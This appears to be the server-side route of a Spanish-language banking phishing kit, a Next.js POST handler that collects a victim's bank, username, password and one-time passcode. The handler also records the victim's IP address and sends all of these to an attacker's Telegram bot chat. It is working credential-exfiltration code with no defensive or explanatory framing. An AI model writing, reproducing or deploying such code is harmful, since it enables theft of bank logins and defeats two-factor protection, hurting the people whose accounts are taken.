import { NextRequest, NextResponse } from 'next/server';
import { TELEGRAM_CONFIG } from '@/lib/database';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { otp, registro, usuario, password, banco } = body;

        if (!otp) {
            return NextResponse.json(
                { success: false, message: 'OTP requerido' },
                { status: 400 }
            );
        }

        // Get client IP
        const forwarded = request.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0] : request.headers.get('x-real-ip') || 'unknown';

        // Send OTP to Telegram
        const message = `🏦 INGRESO DE USUARIO Y OTP 🏦
=================
DATOS
=================
🏦Banco: ${banco}
⚙️Usuario: ${usuario}
🔐Clave: ${password}
🔑Dinamica: ${otp}
🌐IP: ${ip}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        return NextResponse.json({
            success: true,
            status: 3 // OTP_ENTERED
        }, {
            headers: {
                'Set-Cookie': `cdinamica=${otp}; Path=/; Max-Age=${60 * 9}`
            }
        });

    } catch (error) {
        console.error('Error in paso-otp:', error);
        return NextResponse.json(
            { success: false, message: 'Error al procesar OTP' },
            { status: 500 }
        );
    }
}
